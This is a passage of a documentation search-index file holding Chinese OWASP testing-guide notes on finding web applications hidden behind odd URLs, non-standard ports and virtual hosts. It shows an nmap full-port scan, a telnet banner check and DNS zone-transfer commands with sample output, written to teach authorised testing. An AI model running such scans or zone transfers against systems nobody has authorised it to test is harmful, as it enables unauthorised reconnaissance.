\u5e94\u7528\u7a0b\u5e8f\u3002\u663e\u7136\uff0c\u5206\u6790\u7684\u8303\u56f4\u6df1\u53d7\u6d4b\u8bd5\u4eba\u5458\u6d4b\u8bd5\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u6216\u53ea\u6d4b\u8bd5\u4ed6\u4eec\u77e5\u9053\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5f71\u54cd\u3002</p> <p>\u6709\u65f6\uff0c\u76ee\u6807\u89c4\u8303\u66f4\u4e30\u5bcc\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a IP \u5730\u5740\u5217\u8868\u53ca\u5176\u76f8\u5e94\u7684\u7b26\u53f7\u540d\u79f0\u3002\u7136\u800c\uff0c\u8fd9\u4e2a\u5217\u8868\u53ef\u80fd\u4f20\u8fbe\u4e86\u90e8\u5206\u4fe1\u606f\uff0c\u5373\u5b83\u53ef\u80fd\u7701\u7565\u4e86\u4e00\u4e9b\u7b26\u53f7\u540d\u79f0\uff0c\u800c\u5ba2\u6237\u751a\u81f3\u53ef\u80fd\u6ca1\u6709\u610f\u8bc6\u5230\u8fd9\u4e00\u70b9\uff08\u8fd9\u5728\u5927\u578b\u7ec4\u7ec7\u4e2d\u66f4\u6709\u53ef\u80fd\u53d1\u751f\uff09\u3002</p> <p>\u5f71\u54cd\u8bc4\u4f30\u8303\u56f4\u7684\u5176\u4ed6\u95ee\u9898\u7531\u5728\u975e\u660e\u663e URL\uff08\u4f8b\u5982\uff0c<code>http://www.example.com/some-strange-URL</code>\uff09\u4e0a\u53d1\u5e03\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u8868\u793a\uff0c\u8fd9\u4e9b URL \u672a\u5728\u5176\u4ed6\u5730\u65b9\u5f15\u7528\u3002\u8fd9\u53ef\u80fd\u662f\u7531\u4e8e\u9519\u8bef\uff08\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff09\u6216\u6709\u610f\uff08\u4f8b\u5982\uff0c\u672a\u516c\u5e03\u7684\u7ba1\u7406\u754c\u9762\uff09\u9020\u6210\u7684\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0c\u6709\u5fc5\u8981\u6267\u884c Web \u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u679a\u4e3e\u8303\u56f4\u5185\u5b58\u5728\u4e8e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u53d1\u73b0\u662f\u4e00\u4e2a\u65e8\u5728\u8bc6\u522b\u7ed9\u5b9a\u57fa\u7840\u67b6\u6784\u4e0a\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u540e\u8005\u901a\u5e38\u6307\u5b9a\u4e3a\u4e00\u7ec4 IP \u5730\u5740\uff08\u53ef\u80fd\u662f\u4e00\u4e2a\u7f51\u7edc\u5757\uff09\uff0c\u4f46\u4e5f\u53ef\u80fd\u5305\u542b\u4e00\u7ec4 DNS \u7b26\u53f7\u540d\u79f0\u6216\u4e24\u8005\u7684\u6df7\u5408\u3002\u8fd9\u4e9b\u4fe1\u606f\u5728\u8bc4\u4f30\u6267\u884c\u4e4b\u524d\u5206\u53d1\uff0c\u65e0\u8bba\u662f\u7ecf\u5178\u98ce\u683c\u7684\u6e17\u900f\u6d4b\u8bd5\u8fd8\u662f\u4ee5\u5e94\u7528\u7a0b\u5e8f\u4e3a\u4e2d\u5fc3\u7684\u8bc4\u4f30\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u53c2\u4e0e\u89c4\u5219\u53e6\u6709\u89c4\u5b9a\uff08\u4f8b\u5982\uff0c\u4ec5\u6d4b\u8bd5\u4f4d\u4e8e URL \u7684\u5e94\u7528\u7a0b\u5e8f<code>http://www.example.com/</code>\uff09\uff0c\u5426\u5219\u8bc4\u4f30\u5e94\u529b\u6c42\u8303\u56f4\u6700\u5168\u9762\uff0c\u5373\u5b83\u5e94\u8bc6\u522b\u53ef\u901a\u8fc7\u7ed9\u5b9a\u76ee\u6807\u8bbf\u95ee\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u3002\u4ee5\u4e0b\u793a\u4f8b\u68c0\u67e5\u4e86\u53ef\u7528\u4e8e\u5b9e\u73b0\u6b64\u76ee\u6807\u7684\u4e00\u4e9b\u6280\u672f\u3002</p> <p>\u4ee5\u4e0b\u4e00\u4e9b\u6280\u672f\u9002\u7528\u4e8e\u9762\u5411 Internet \u7684 Web \u670d\u52a1\u5668\uff0c\u5373 DNS \u548c\u53cd\u5411 IP \u57fa\u4e8e Web \u7684\u641c\u7d22\u670d\u52a1\u4ee5\u53ca\u641c\u7d22\u5f15\u64ce\u7684\u4f7f\u7528\u3002\u793a\u4f8b\u4f7f\u7528\u79c1\u6709 IP \u5730\u5740\uff08\u4f8b\u5982<code>192.168.1.100</code>\uff09\uff0c\u9664\u975e\u53e6\u6709\u8bf4\u660e\uff0c\u5426\u5219\u4ee3\u8868_\u901a\u7528_IP \u5730\u5740\u5e76\u4e14\u4ec5\u7528\u4e8e\u533f\u540d\u76ee\u7684\u3002</p> <p>\u5f71\u54cd\u6709\u591a\u5c11\u5e94\u7528\u7a0b\u5e8f\u4e0e\u7ed9\u5b9a DNS \u540d\u79f0\uff08\u6216 IP \u5730\u5740\uff09\u76f8\u5173\u7684\u4e09\u4e2a\u56e0\u7d20\uff1a</p> <ol> <li> <p>\u4e0d\u540c\u7684\u57fa\u672c URL</p> <p>Web \u5e94\u7528\u7a0b\u5e8f\u7684\u660e\u663e\u5165\u53e3\u70b9\u662f<code>www.example.com</code>\uff0c\u5373\uff0c\u4f7f\u7528\u8fd9\u79cd\u7b80\u5199\u7b26\u53f7\uff0c\u6211\u4eec\u8ba4\u4e3a Web \u5e94\u7528\u7a0b\u5e8f\u8d77\u6e90\u4e8e<code>http://www.example.com/</code>\uff08\u8fd9\u540c\u6837\u9002\u7528\u4e8e HTTPS\uff09\u3002\u7136\u800c\uff0c\u5373\u4f7f\u8fd9\u662f\u6700\u5e38\u89c1\u7684\u60c5\u51b5\uff0c\u4e5f\u6ca1\u6709\u5f3a\u5236\u5e94\u7528\u7a0b\u5e8f\u4ece<code>/</code>.</p> <p>\u4f8b\u5982\uff0c\u76f8\u540c\u7684\u7b26\u53f7\u540d\u79f0\u53ef\u80fd\u4e0e\u4e09\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u8054\uff0c\u4f8b\u5982\uff1a<code>http://www.example.com/url1</code> <code>http://www.example.com/url2</code> <code>http://www.example.com/url3</code></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cURL<code>http://www.example.com/</code>\u4e0d\u4f1a\u4e0e\u6709\u610f\u4e49\u7684\u9875\u9762\u76f8\u5173\u8054\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5c06\u88ab\u9690\u85cf\uff0c\u9664\u975e\u6d4b\u8bd5\u4eba\u5458\u660e\u786e\u77e5\u9053\u5982\u4f55\u8bbf\u95ee\u5b83\u4eec\uff0c\u5373\u6d4b\u8bd5\u4eba\u5458\u77e5\u9053_url1_\u3001url2_\u6216_url3\u3002\u901a\u5e38\u4e0d\u9700\u8981\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u53d1\u5e03 Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u9664\u975e\u6240\u6709\u8005\u4e0d\u5e0c\u671b\u4ee5\u6807\u51c6\u65b9\u5f0f\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u4e14\u51c6\u5907\u544a\u77e5\u7528\u6237\u5176\u786e\u5207\u4f4d\u7f6e\u3002\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u79d8\u5bc6\u7684\uff0c\u53ea\u662f\u5b83\u4eec\u7684\u5b58\u5728\u548c\u4f4d\u7f6e\u6ca1\u6709\u88ab\u660e\u786e\u516c\u5e03\u3002</p> </li> <li> <p>\u975e\u6807\u51c6\u7aef\u53e3</p> <p>\u867d\u7136 Web \u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u4f4d\u4e8e\u7aef\u53e3 80 (HTTP) \u548c 443 (HTTPS) \u4e0a\uff0c\u4f46\u8fd9\u4e9b\u7aef\u53e3\u53f7\u5e76\u6ca1\u6709\u4ec0\u4e48\u795e\u5947\u4e4b\u5904\u3002\u4e8b\u5b9e\u4e0a\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4e0e\u4efb\u610f TCP \u7aef\u53e3\u76f8\u5173\u8054\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7aef\u53e3\u53f7\u6765\u5f15\u7528\uff0c\u5982\u4e0b\u6240\u793a\uff1a<code>http[s]://www.example.com:port/</code>.\u00a0\u4f8b\u5982\uff0c<code>http://www.example.com:20000/</code>\u3002</p> </li> <li> <p>\u865a\u62df\u4e3b\u673a</p> <p>DNS \u5141\u8bb8\u5355\u4e2a IP \u5730\u5740\u4e0e\u4e00\u4e2a\u6216\u591a\u4e2a\u7b26\u53f7\u540d\u79f0\u76f8\u5173\u8054\u3002\u4f8b\u5982\uff0cIP \u5730\u5740<code>192.168.1.100</code>\u53ef\u80fd\u4e0e DNS \u540d\u79f0<code>www.example.com</code>\u3001<code>helpdesk.example.com</code>\u3001\u76f8\u5173\u8054<code>webmail.example.com</code>\u3002\u4e0d\u5fc5\u6240\u6709\u540d\u79f0\u90fd\u5c5e\u4e8e\u540c\u4e00\u4e2a DNS \u57df\u3002\u8fd9\u79cd 1 \u5bf9 N \u7684\u5173\u7cfb\u53ef\u4ee5\u53cd\u6620\u4e3a\u901a\u8fc7\u4f7f\u7528\u6240\u8c13\u7684\u865a\u62df\u4e3b\u673a\u6765\u63d0\u4f9b\u4e0d\u540c\u7684\u5185\u5bb9\u3002\u6211\u4eec\u6240\u6307\u7684\u6307\u5b9a\u865a\u62df\u4e3b\u673a\u7684\u4fe1\u606f\u5d4c\u5165\u5728 HTTP 1.1\u4e3b\u673a\u6807\u5934\u4e2d\u3002</p> <p>\u4eba\u4eec\u4e0d\u4f1a\u6000\u7591\u9664\u4e86\u663e\u800c\u6613\u89c1\u7684\u4e4b\u5916\u8fd8\u6709\u5176\u4ed6 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u5728<code>www.example.com</code>\uff0c\u9664\u975e\u4ed6\u4eec\u77e5\u9053<code>helpdesk.example.com</code>\u548c<code>webmail.example.com</code>\u3002</p> </li> </ol>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#1-url","title":"\u89e3\u51b3\u95ee\u9898 1 \u7684\u65b9\u6cd5 - \u975e\u6807\u51c6 URL","text":"<p>\u6ca1\u6709\u529e\u6cd5\u5b8c\u5168\u786e\u5b9a\u662f\u5426\u5b58\u5728\u975e\u6807\u51c6\u547d\u540d\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u7531\u4e8e\u662f\u975e\u6807\u51c6\u7684\uff0c\u56e0\u6b64\u6ca1\u6709\u7ba1\u7406\u547d\u540d\u7ea6\u5b9a\u7684\u56fa\u5b9a\u6807\u51c6\uff0c\u4f46\u662f\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6280\u672f\u6765\u83b7\u5f97\u4e00\u4e9b\u989d\u5916\u7684\u6d1e\u5bdf\u529b\u3002</p> <p>\u9996\u5148\uff0c\u5982\u679c Web \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef\u5e76\u5141\u8bb8\u76ee\u5f55\u6d4f\u89c8\uff0c\u5219\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u5728\u8fd9\u65b9\u9762\u6709\u6240\u5e2e\u52a9\u3002</p> <p>\u5176\u6b21\uff0c\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u88ab\u5176\u4ed6\u7f51\u9875\u5f15\u7528\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u88ab\u7f51\u7edc\u641c\u7d22\u5f15\u64ce\u6293\u53d6\u548c\u7d22\u5f15\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u6000\u7591\u6b64\u7c7b\u9690\u85cf\u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u5728\uff0c<code>www.example.com</code>\u4ed6\u4eec\u53ef\u4ee5\u4f7f\u7528_\u7f51\u7ad9_\u8fd0\u8425\u5546\u8fdb\u884c\u641c\u7d22\u5e76\u68c0\u67e5\u67e5\u8be2\u7ed3\u679c<code>site: www.example.com</code>\u3002\u5728\u8fd4\u56de\u7684 URL \u4e2d\uff0c\u53ef\u80fd\u6709\u4e00\u4e2a\u6307\u5411\u8fd9\u6837\u4e00\u4e2a\u4e0d\u660e\u663e\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u53e6\u4e00\u79cd\u9009\u62e9\u662f\u63a2\u6d4b\u53ef\u80fd\u662f\u672a\u53d1\u5e03\u5e94\u7528\u7a0b\u5e8f\u5019\u9009\u8005\u7684 URL\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u4ece <code>https://www.example.com/webmail</code>\u3001<code>https://webmail.example.com/</code> \u6216 <code>https://mail.example.com/</code>\u7b49 URL \u8bbf\u95ee Web\u90ae\u4ef6\u524d\u7aef\u3002\u8fd9\u540c\u6837\u9002\u7528\u4e8e\u7ba1\u7406\u754c\u9762\uff0c\u5b83\u4eec\u53ef\u4ee5\u5728\u9690\u85cf\u7684 URL \u4e0a\u53d1\u5e03\uff08\u4f8b\u5982\uff0cTomcat \u7ba1\u7406\u754c\u9762\uff09\uff0c\u4f46\u4e0d\u4f1a\u5728\u4efb\u4f55\u5730\u65b9\u5f15\u7528\u3002\u56e0\u6b64\uff0c\u8fdb\u884c\u4e00\u4e9b\u5b57\u5178\u5f0f\u641c\u7d22\uff08\u6216\u201c\u667a\u80fd\u731c\u6d4b\u201d\uff09\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e00\u4e9b\u7ed3\u679c\u3002\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u5728\u8fd9\u65b9\u9762\u6709\u6240\u5e2e\u52a9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#2-","title":"\u89e3\u51b3\u95ee\u9898 2 \u7684\u65b9\u6cd5 - \u975e\u6807\u51c6\u7aef\u53e3","text":"<p>\u5f88\u5bb9\u6613\u68c0\u67e5\u975e\u6807\u51c6\u7aef\u53e3\u4e0a\u662f\u5426\u5b58\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u3002Nmap\u7b49\u7aef\u53e3\u626b\u63cf\u5668\u53ef\u4ee5\u901a\u8fc7<code>-sV</code>\u9009\u9879\u8fdb\u884c\u670d\u52a1\u8bc6\u522b\uff0c\u8bc6\u522b\u4efb\u610f\u7aef\u53e3\u4e0a\u7684http[s]\u670d\u52a1\u3002\u6240\u9700\u8981\u7684\u662f\u5bf9\u6574\u4e2a 64k TCP \u7aef\u53e3\u5730\u5740\u7a7a\u95f4\u7684\u5168\u9762\u626b\u63cf\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u901a\u8fc7 TCP \u8fde\u63a5\u626b\u63cf\u67e5\u627e IP \u4e0a\u6240\u6709\u6253\u5f00\u7684\u7aef\u53e3\uff0c<code>192.168.1.100</code>\u5e76\u5c1d\u8bd5\u786e\u5b9a\u54ea\u4e9b\u670d\u52a1\u7ed1\u5b9a\u5230\u5b83\u4eec\uff08\u4ec5\u663e\u793a_\u5fc5\u8981_\u7684\u5f00\u5173 - Nmap \u5177\u6709\u5e7f\u6cdb\u7684\u9009\u9879\u96c6\uff0c\u5176\u8ba8\u8bba\u662f\u8d85\u51fa\u8303\u56f4\uff09\uff1a</p> <p><code>nmap \u2013Pn \u2013sT \u2013sV \u2013p0-65535 192.168.1.100</code></p> <p>\u68c0\u67e5\u8f93\u51fa\u5e76\u67e5\u627e HTTP \u6216 TLS \u5305\u88c5\u670d\u52a1\u7684\u6307\u793a\uff08\u5e94\u63a2\u6d4b\u4ee5\u786e\u8ba4\u5b83\u4eec\u662f HTTPS\uff09\u5c31\u8db3\u591f\u4e86\u3002\u4f8b\u5982\uff0c\u4e0a\u4e00\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>Interesting ports on 192.168.1.100:\n(The 65527 ports scanned but not shown below are in state: closed)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)\n80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))\n443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1\n</code></pre> <p>\u4ece\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa\uff1a</p> <ul> <li>\u6709\u4e00\u4e2a Apache HTTP \u670d\u52a1\u5668\u5728\u7aef\u53e3 80 \u4e0a\u8fd0\u884c\u3002</li> <li>443\u7aef\u53e3\u597d\u50cf\u6709HTTPS\u670d\u52a1\u5668\uff08\u4e0d\u8fc7\u8fd9\u4e2a\u9700\u8981\u786e\u8ba4\uff0c\u6bd4\u5982<code>https://192.168.1.100</code>\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\uff09\u3002</li> <li>\u5728\u7aef\u53e3 901 \u4e0a\u6709\u4e00\u4e2a Samba SWAT Web \u754c\u9762\u3002</li> <li>\u7aef\u53e3 1241 \u4e0a\u7684\u670d\u52a1\u4e0d\u662f HTTPS\uff0c\u800c\u662f TLS \u5c01\u88c5\u7684 Nessus \u5b88\u62a4\u8fdb\u7a0b\u3002</li> <li>\u7aef\u53e3 3690 \u5177\u6709\u672a\u6307\u5b9a\u7684\u670d\u52a1\uff08Nmap \u8fd4\u56de\u5176_\u6307\u7eb9_- \u6b64\u5904\u4e3a\u6e05\u695a\u8d77\u89c1\u7701\u7565 - \u4ee5\u53ca\u5c06\u5176\u63d0\u4ea4\u5e76\u7eb3\u5165 Nmap \u6307\u7eb9\u6570\u636e\u5e93\u7684\u8bf4\u660e\uff0c\u524d\u63d0\u662f\u60a8\u77e5\u9053\u5b83\u4ee3\u8868\u7684\u670d\u52a1\uff09\u3002</li> <li>\u7aef\u53e3 8000 \u4e0a\u7684\u53e6\u4e00\u4e2a\u672a\u6307\u5b9a\u670d\u52a1\uff1b\u8fd9\u53ef\u80fd\u662f HTTP\uff0c\u56e0\u4e3a\u5728\u6b64\u7aef\u53e3\u4e0a\u627e\u5230 HTTP \u670d\u52a1\u5668\u5e76\u4e0d\u7f55\u89c1\u3002\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff1a</li> </ul> <pre><code>$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is '^]'.\nGET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n&lt;html&gt;\n...\n</code></pre> <p>\u8fd9\u8bc1\u5b9e\u5b83\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a HTTP \u670d\u52a1\u5668\u3002\u6216\u8005\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u7f51\u7edc\u6d4f\u89c8\u5668\u8bbf\u95ee\u8be5 URL\uff1b\u6216\u4f7f\u7528 GET \u6216 HEAD Perl \u547d\u4ee4\uff0c\u5b83\u4eec\u6a21\u4eff HTTP \u4ea4\u4e92\uff0c\u4f8b\u5982\u4e0a\u9762\u7ed9\u51fa\u7684\u4ea4\u4e92\uff08\u4f46\u662f HEAD \u8bf7\u6c42\u53ef\u80fd\u4e0d\u4f1a\u88ab\u6240\u6709\u670d\u52a1\u5668\u63a5\u53d7\uff09\u3002</p> <ul> <li>Apache Tomcat \u5728\u7aef\u53e3 8080 \u4e0a\u8fd0\u884c\u3002</li> </ul> <p>\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u4f1a\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\uff0c\u4f46\u9996\u5148\u68c0\u67e5\u6240\u9009\u626b\u63cf\u5668\u662f\u5426\u80fd\u591f\u8bc6\u522b\u5728\u975e\u6807\u51c6\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684 HTTP[S] \u670d\u52a1\u3002\u4f8b\u5982\uff0cNessus \u80fd\u591f\u5728\u4efb\u610f\u7aef\u53e3\u4e0a\u8bc6\u522b\u5b83\u4eec\uff08\u524d\u63d0\u662f\u5b83\u88ab\u6307\u793a\u626b\u63cf\u6240\u6709\u7aef\u53e3\uff09\uff0c\u5e76\u4e14\u5c06\u63d0\u4f9b\u5173\u4e8e Nmap \u7684\u5927\u91cf\u9488\u5bf9\u5df2\u77e5 Web \u670d\u52a1\u5668\u6f0f\u6d1e\u7684\u6d4b\u8bd5\uff0c\u4ee5\u53ca TLS/ HTTPS \u670d\u52a1\u7684 SSL \u914d\u7f6e\u3002\u5982\u524d\u6240\u8ff0\uff0cNessus \u8fd8\u80fd\u591f\u53d1\u73b0\u6d41\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u6216 web \u754c\u9762\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u88ab\u5ffd\u89c6\uff08\u4f8b\u5982\uff0cTomcat \u7ba1\u7406\u754c\u9762\uff09\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#3-","title":"\u89e3\u51b3\u95ee\u9898 3 \u7684\u65b9\u6cd5 - \u865a\u62df\u4e3b\u673a","text":"<p>\u6709\u8bb8\u591a\u6280\u672f\u53ef\u7528\u4e8e\u8bc6\u522b\u4e0e\u7ed9\u5b9a IP \u5730\u5740\u5173\u8054\u7684 DNS \u540d\u79f0<code>x.y.z.t</code>\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#dns","title":"DNS \u533a\u57df\u4f20\u8f93","text":"<p>\u8003\u8651\u5230 DNS \u670d\u52a1\u5668\u57fa\u672c\u4e0a\u4e0d\u652f\u6301\u533a\u57df\u4f20\u8f93\u8fd9\u4e00\u4e8b\u5b9e\uff0c\u8fd9\u79cd\u6280\u672f\u73b0\u5728\u7684\u4f7f\u7528\u53d7\u5230\u9650\u5236\u3002\u4f46\u662f\uff0c\u8fd9\u53ef\u80fd\u503c\u5f97\u4e00\u8bd5\u3002\u9996\u5148\uff0c\u6d4b\u8bd5\u4eba\u5458\u5fc5\u987b\u786e\u5b9a\u670d\u52a1\u4e8e<code>x.y.z.t</code>.\u00a0\u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u540d\u79f0\u5df2\u77e5<code>x.y.z.t</code>\uff08\u5047\u8bbe\u4e3a\uff09\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u3001\u6216\u7b49\u5de5\u5177\u901a\u8fc7\u8bf7\u6c42 DNS NS \u8bb0\u5f55<code>www.example.com</code>\u6765\u786e\u5b9a\u5176\u540d\u79f0\u670d\u52a1\u5668\u3002<code>nslookup``host``dig</code></p> <p>\u5982\u679c\u6ca1\u6709\u5df2\u77e5\u7684\u7b26\u53f7\u540d\u79f0<code>x.y.z.t</code>\uff0c\u4f46\u76ee\u6807\u5b9a\u4e49\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u540d\u79f0\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5e94\u7528\u76f8\u540c\u7684\u8fc7\u7a0b\u5e76\u67e5\u8be2\u8be5\u540d\u79f0\u7684\u540d\u79f0\u670d\u52a1\u5668\uff08\u5e0c\u671b\u8be5\u540d\u79f0\u670d\u52a1\u5668<code>x.y.z.t</code>\u4e5f\u80fd\u63d0\u4f9b\u670d\u52a1\uff09\u3002\u4f8b\u5982\uff0c\u5982\u679c\u76ee\u6807\u7531 IP \u5730\u5740<code>x.y.z.t</code>\u548c\u540d\u79f0\u7ec4\u6210<code>mail.example.com</code>\uff0c\u5219\u786e\u5b9a\u57df\u7684\u540d\u79f0\u670d\u52a1\u5668<code>example.com</code>\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u663e\u793a\u5982\u4f55<code>www.owasp.org</code>\u4f7f\u7528\u4ee5\u4e0b<code>host</code>\u547d\u4ee4\u8bc6\u522b\u540d\u79f0\u670d\u52a1\u5668\uff1a</p> <pre><code>$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.\n</code></pre> <p>\u73b0\u5728\u53ef\u4ee5\u5411\u57df\u7684\u540d\u79f0\u670d\u52a1\u5668\u8bf7\u6c42\u533a\u57df\u4f20\u8f93<code>example.com</code>\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e78\u8fd0\u7684\u8bdd\uff0c\u4ed6\u4eec\u5c06\u5f97\u5230\u8be5\u57df\u7684 DNS \u6761\u76ee\u5217\u8868\u3002\u8fd9\u5c06\u5305\u62ec\u660e\u663e<code>www.example.com</code>\u7684\u548c\u4e0d\u592a\u660e\u663e\u7684<code>helpdesk.example.com</code>\u4ee5\u53ca<code>webmail.example.com</code>\uff08\u53ef\u80fd\u8fd8\u6709\u5176\u4ed6\uff09\u3002\u68c0\u67e5\u533a\u57df\u4f20\u8f93\u8fd4\u56de\u7684\u6240\u6709\u540d\u79f0\uff0c\u5e76\u8003\u8651\u6240\u6709\u4e0e\u6b63\u5728\u8bc4\u4f30\u7684\u76ee\u6807\u76f8\u5173\u7684\u540d\u79f0\u3002</p> <p>\u5c1d\u8bd5<code>owasp.org</code>\u4ece\u5176\u540d\u79f0\u670d\u52a1\u5668\u4e4b\u4e00\u8bf7\u6c42\u533a\u57df\u4f20\u8f93\uff1a</p> <pre><code>$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5(REFUSED)\n; Transfer failed.\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#dns_1","title":"DNS \u53cd\u5411\u67e5\u8be2","text":"<p>\u6b64\u8fc7\u7a0b\u4e0e\u524d\u4e00\u4e2a\u8fc7\u7a0b\u7c7b\u4f3c\uff0c\u4f46\u4f9d\u8d56\u4e8e\u53cd\u5411 (PTR) DNS \u8bb0\u5f55\u3002\u4e0d\u8981\u8bf7\u6c42\u533a\u57df\u4f20\u8f93\uff0c\u800c\u662f\u5c1d\u8bd5\u5c06\u8bb0\u5f55\u7c7b\u578b\u8bbe\u7f6e\u4e3a PTR \u5e76\u5728\u7ed9\u5b9a\u7684 IP \u5730\u5740\u4e0a\u53d1\u51fa\u67e5\u8be2\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e78\u8fd0\u7684\u8bdd\uff0c\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a DNS 